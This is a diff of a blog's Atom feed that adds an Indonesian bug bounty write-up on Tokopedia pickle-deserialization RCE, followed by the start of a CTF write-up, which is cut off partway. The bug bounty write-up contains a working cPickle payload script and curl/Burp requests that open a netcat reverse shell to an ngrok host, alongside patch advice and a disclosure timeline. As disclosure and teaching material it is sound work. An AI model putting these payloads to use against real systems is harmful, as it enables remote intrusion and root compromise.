@@ -7,7 +7,7 @@
 <generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
 <link rel="self" type="application/atom+xml" href="http://localhost:4000/feed.xml" />
 <link rel="alternate" type="text/html" href="http://localhost:4000/" />
-<updated>2018-04-01T16:14:00+07:00</updated>
+<updated>2018-09-10T20:25:15+07:00</updated>
 <id>http://localhost:4000/</id>
 <author>
   <name>Abdillah Muhamad</name>
@@ -17,11 +17,634 @@
 
 
 <entry>
+  <title type="html"><![CDATA[How I Hack Tokopedia (third party server) with pickle object]]></title>
+  <link rel="alternate" type="text/html" href="http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize"/>
+  <id>http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize</id>
+  <published>2018-09-10T00:00:00+07:00</published>
+  <updated>2018-09-10T00:00:00-00:00</updated>
+  
+  <author>
+    <name>Abdillah Muhamad</name>
+    <uri>http://localhost:4000</uri>
+    <email>hasny1337@gmail.com</email>
+  </author>
+  
+  
+  <category scheme="http://localhost:4000/tags/#Bugbounty" term="Bugbounty" />
+  
+  
+  <content type="html">
+  
+    &lt;h3 id=&quot;apa-itu-rce&quot;&gt;Apa itu RCE?&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;RCE (Remote Command Injection) adalah kelemahan dimana attacker dapat memerintah sistem untuk menjalankan kode yang dinginkan, Tipe attack seperti ini biasanya karena kurangnya validasi terhadap data yang bisa dikendalikan oleh user.&lt;/p&gt;
+
+&lt;h3 id=&quot;apa-dampaknya-&quot;&gt;Apa Dampaknya ?&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Attacker dapat menjalankan perintah pada sistem dengan hak akses root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img width=&quot;400px&quot; src=&quot;https://media.giphy.com/media/1dIo6kDOPMzsnMOJTj/giphy.gif&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept&quot;&gt;Proof Of Concept&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Secara tidak sengaja ketika saya mendapatkan email promosi dari tokopedia saya kemudian tertarik untuk menganalisa sebentar pada email yang tokopedia kirimkan.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tokopedia/promo-tokped.png&quot; alt=&quot;Promo Minggu ini&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;saya memperhatikan semua link yang ada pada email tersebut meggunakan https://explorer.tokopedia.com kemudian saya mencoba membuka salah satu link yaitu :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://explorer.tokopedia.com/v1/emailclick?em=1337%40gmail.com&amp;amp;user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.&amp;amp;d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.&amp;amp;ts=1536374957&amp;amp;cid=S%27%5Cxdd%5Cxe2%5Cx93%5Cx93i%5Cx0b%5Cx00%3Dd%5Cxac%24%2C%5Cxfah%5Cx91%5Cxc9Cz%5Cxc9%5Cxc65%5Cxef%5Cx81%5Cx04%5Cx84%5Cxc4-%5Cxaf%5Cxa44%5Cxe2%5Cx10ee%22%5Cxeb%5Cx0b%5Cx16N%3C%5Cxec%5Cx16%2Cs%5Cxa8%5Cxe3%5Cxaf.%5Cxe4A%5Cxc5Q%27%0Ap0%0A.&amp;amp;ut=l&amp;amp;moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli48&amp;amp;app_id=S%27%60%5Cx8ele_%5Cx8ao%5Cxb4%5Cx9dJ%5Cr%5Cx01%5Cxee%5Cx80%5Cxbc%5Cx8ck%5Cxd7%5Cx83%2FUk%60%5Cxfe%5Cx16%5Cxd7+%5Cxa5%5Cx90%5D%5Cxda%5Cx93%27%0Ap0%0A.&amp;amp;pl=A&amp;amp;c_t=ge&amp;amp;rlink=https://tokopedia.link/EBxQm0a00P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26utm_content=C3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ada beberapa parameter yang menarik karena setelah saya lakukan url-decode ternyata yang dikirim adalah dalam bentuk Pickle String Python jadi karena seperti yang kita ketahu pada dokumentasi python sendiri Pickle sudah di warning agar tidak menerima input dari user karena dapat di-abuse untuk mendapatkan akses kepada sistem&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.
+d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.
+cid=S%27%5Cxdd%5Cxe2%5Cx93%5Cx93i%5Cx0b%5Cx00%3Dd%5Cxac%24%2C%5Cxfah%5Cx91%5Cxc9Cz%5Cxc9%5Cxc65%5Cxef%5Cx81%5Cx04%5Cx84%5Cxc4-%5Cxaf%5Cxa44%5Cxe2%5Cx10ee%22%5Cxeb%5Cx0b%5Cx16N%3C%5Cxec%5Cx16%2Cs%5Cxa8%5Cxe3%5Cxaf.%5Cxe4A%5Cxc5Q%27%0Ap0%0A.
+app_id=S%27%60%5Cx8ele_%5Cx8ao%5Cxb4%5Cx9dJ%5Cr%5Cx01%5Cxee%5Cx80%5Cxbc%5Cx8ck%5Cxd7%5Cx83%2FUk%60%5Cxfe%5Cx16%5Cxd7+%5Cxa5%5Cx90%5D%5Cxda%5Cx93%27%0Ap0%0A.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Parameter yang vulnerable adalah : user_id , d , cid , app_id&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Hasil decode dari parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;user_id&lt;/code&gt; adalah :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;S'\x8d\xe9\xd1Y\xdb\x10\t\x92\xd2\x10\x80\xd7\x9d\xa4\xc7\x9eM_* \xc6,\xb6\x91\x98\xe0\xben\xfe\xda\xfa\xf4'
+p0
+.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dari melihat struktur data tersebut sudah bisa ditebak bahwa itu pickle strings yang akan dikirimkan melalui parameter yang vulnerable tersebut, dengan melakukan modifikasi pada pickle strings yang dikirimkan saya bisa mendapatkan reverse shell untuk akses server tokopedia secara penuh.&lt;/p&gt;
+
+&lt;p&gt;untuk melakukan reverse shell kita dapat membuat listener menggunakan nc &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 8080&lt;/code&gt;, karena ip address saya tidak memiliki public ip maka saya menggunakan ngrok untuk melakukan tuneling dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;./ngrok.exe tcp 8080&lt;/code&gt; kemudian kita dapat mengakses ngrok pada &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost:4040&lt;/code&gt; untuk mendapatkan public address yang di assign ngrok.&lt;/p&gt;
+
+&lt;p&gt;untuk membuat payload reverse shell dengan cPickle saya gunakan script python dibawah, kemudian output dari script ini dimasukan kedalam salah satu parameter yang vulnerable diatas yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;user_id | d | cid | app_id&lt;/code&gt; salah satu parameter saja.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cPickle&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;DEFAULT_COMMAND&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rm /tmp/shell; mknod /tmp/shell p; nc 0.tcp.ngrok.io 11758 0&amp;lt;/tmp/shell | /bin/sh 1&amp;gt;/tmp/shell&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;COMMAND&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DEFAULT_COMMAND&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PickleRce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;COMMAND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PickleRce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;kemudian kita dapat menjalankan request ini menggunakan burpsuite.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /v1/emailclick?em=1337%40gmail.com&amp;amp;user_id=cposix%0Asystem%0Ap1%0A%28S%27rm%20/tmp/shell%3B%20mknod%20/tmp/shell%20p%3B%20nc%200.tcp.ngrok.io%2011758%200%3C/tmp/shell%20%7C%20/bin/sh%201%3E/tmp/shell%27%0Ap2%0AtRp3%0A.&amp;amp;d=S%27%5Cxf2%5Cxb2%5Cxb3%5Cxd2%5Cx90%25%5Cxf82%5Cxe3h%5Cxa7%5Cxa1%5Cx13uow%5Cr%5Cx92K%5Cx12%7E%27%0Ap0%0A.&amp;amp;ts=1536374957&amp;amp;cid=S%224%5Cxc2%5Cxe4BQ%5Cxfe%5Cx8f%5Cxcd%5Cxf5%5Cx83f%27T%5Cx04%5Cx13%5Cxf3%5Cxbf%5Cxd9%27EHB%5Cx0b%5Cxcc%5Cx08%5Cxc9U%5Cxaf%28S%5Cxb3%5Cxcc%5Cx91%5Cxbf%5Cxf6%5Cx1e%5Cxfe%5Cxb6%5Cx11i%5Cxd7g%5Cxaf%5Cxcf%5Cx06%5Cxf0%5Cxf2%5CnDll%5Cxeb%22%0Ap0%0A.&amp;amp;ut=l&amp;amp;moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli42&amp;amp;app_id=S%27%5Cxd8%5C%5C%5Cx80%5Cxb8%5Cxb9f%5Cxb4%5Cxf9%5CxceC%5Cx85%22k%5Cxec%5Cxca%5Cxc9h%5Cx0b%5CxcfIf%5Cx8b%5Cx0e%5Cx84%5Cx06%5Cxade%5Cxa6%5Cxd1%5Cxa1.%5Cxe8%27%0Ap0%0A.&amp;amp;pl=A&amp;amp;c_t=ge&amp;amp;rlink=https://tokopedia.link/Kmg2re6Z0P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26 HTTP/1.1
+Host: explorer.tokopedia.com
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5
+Cookie: [..REDACTED..]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;atau bisa juga menggunakan curl.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &quot;https://explorer.tokopedia.com/v1/emailclick?em=1337%40gmail.com&amp;amp;user_id=cposix%0Asystem%0Ap1%0A%28S%27rm%20/tmp/shell%3B%20mknod%20/tmp/shell%20p%3B%20nc%200.tcp.ngrok.io%2011758%200%3C/tmp/shell%20%7C%20/bin/sh%201%3E/tmp/shell%27%0Ap2%0AtRp3%0A.&amp;amp;d=S%27%5Cxf2%5Cxb2%5Cxb3%5Cxd2%5Cx90%25%5Cxf82%5Cxe3h%5Cxa7%5Cxa1%5Cx13uow%5Cr%5Cx92K%5Cx12%7E%27%0Ap0%0A.&amp;amp;ts=1536374957&amp;amp;cid=S%224%5Cxc2%5Cxe4BQ%5Cxfe%5Cx8f%5Cxcd%5Cxf5%5Cx83f%27T%5Cx04%5Cx13%5Cxf3%5Cxbf%5Cxd9%27EHB%5Cx0b%5Cxcc%5Cx08%5Cxc9U%5Cxaf%28S%5Cxb3%5Cxcc%5Cx91%5Cxbf%5Cxf6%5Cx1e%5Cxfe%5Cxb6%5Cx11i%5Cxd7g%5Cxaf%5Cxcf%5Cx06%5Cxf0%5Cxf2%5CnDll%5Cxeb%22%0Ap0%0A.&amp;amp;ut=l&amp;amp;moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli42&amp;amp;app_id=S%27%5Cxd8%5C%5C%5Cx80%5Cxb8%5Cxb9f%5Cxb4%5Cxf9%5CxceC%5Cx85%22k%5Cxec%5Cxca%5Cxc9h%5Cx0b%5CxcfIf%5Cx8b%5Cx0e%5Cx84%5Cx06%5Cxade%5Cxa6%5Cxd1%5Cxa1.%5Cxe8%27%0Ap0%0A.&amp;amp;pl=A&amp;amp;c_t=ge&amp;amp;rlink=https://tokopedia.link/Kmg2re6Z0P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tokopedia/gotroot.png&quot; alt=&quot;GOT ROOT&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/uINwDsSVEfGsE/giphy.gif&quot; alt=&quot;I AM (G)?ROOT&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tokopedia/gotetcshadow.png&quot; alt=&quot;/ETC/SHADOW&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tokopedia/hostname.png&quot; alt=&quot;hostname&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;how-to-patch-&quot;&gt;HOW TO PATCH ?&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Jangan memasukan input user kedalam &lt;code class=&quot;highlighter-rouge&quot;&gt;cPickle.load[s]?()&lt;/code&gt; atau &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle.load[s]?()&lt;/code&gt; seperti yang sudah di jelaskan pada dokumentasi python sendiri &lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot;&gt;https://docs.python.org/3/library/pickle.html&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tokopedia/pythonpickle.png&quot; alt=&quot;PICKLE WARNING&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;timeline--bonus-content-dlc&quot;&gt;TIMELINE &amp;amp; BONUS CONTENT (DLC)&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Waktu &amp;amp; Tanggal&lt;/th&gt;
+      &lt;th&gt;Deskripsi&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;08 September 2018 5:25 PM&lt;/td&gt;
+      &lt;td&gt;Report Submited&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;08 September 2018 6:30 PM&lt;/td&gt;
+      &lt;td&gt;First Response From Tokopedia&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;09 September 2018 7:00 AM&lt;/td&gt;
+      &lt;td&gt;Tokopedia take down the endpoint&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10 September 2018 3:59 PM&lt;/td&gt;
+      &lt;td&gt;Rewarded&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10 September 2018 20:00 PM&lt;/td&gt;
+      &lt;td&gt;Public Disclose&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Youtube : https://youtu.be/Fo6Emx-LMQE&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;That’s all folks!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/XreQmk7ETCak0/giphy.gif&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;
+
+
+  
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize&quot;&gt;How I Hack Tokopedia (third party server) with pickle object&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on September 10, 2018.&lt;/p&gt;</content>
+</entry>
+
+
+
+<entry>
+  <title type="html"><![CDATA[Hacktoday Quals 2018 - Legcounter]]></title>
+  <link rel="alternate" type="text/html" href="http://localhost:4000/ctf/writeup-legcount-hacktoday-Copy"/>
+  <id>http://localhost:4000/ctf/writeup-legcount-hacktoday - Copy</id>
+  <published>2018-08-05T00:00:00+07:00</published>
+  <updated>2018-08-05T00:00:00-00:00</updated>
+  
+  <author>
+    <name>Abdillah Muhamad</name>
+    <uri>http://localhost:4000</uri>
+    <email>hasny1337@gmail.com</email>
+  </author>
+  
+  
+  <category scheme="http://localhost:4000/tags/#hacktoday" term="hacktoday" />
+  
+  
+  <content type="html">
+  
+    &lt;h3 id=&quot;soal&quot;&gt;Soal&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;http://103.56.207.107:50001&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'init.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$upload_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uploads/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$upload_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$imageFileType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;legpic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PATHINFO_EXTENSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$file_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$upload_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;random_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$imageFileType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getimagesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;legpic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;nv&quot;&gt;$upload_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;nv&quot;&gt;$upload_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;nv&quot;&gt;$t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'csrf_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
